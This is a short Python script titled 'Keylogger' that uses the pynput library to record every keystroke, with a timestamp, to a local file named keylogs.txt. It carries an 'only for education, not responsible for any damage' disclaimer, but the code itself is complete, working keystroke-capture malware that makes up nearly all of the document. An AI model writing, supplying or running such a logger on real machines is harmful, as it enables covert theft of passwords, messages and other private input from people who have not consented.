# ---------- Keylogger ----------
#
# ----------------------- IMPORTANT -----------------------
# ---------- This programm is only for eduction! ----------
# ---------- Im not responsible for any damage! ----------
# ---------------------------------------------------------

# ---------- Import of all important modules for the project ----------

from pynput.keyboard import Key, Listener
import logging

# ---------- The part in which it is defined that all keystrokes should be saved in the .txt file ----------

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# ---------- Main part in which ensures that all inputs can be saved ----------

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()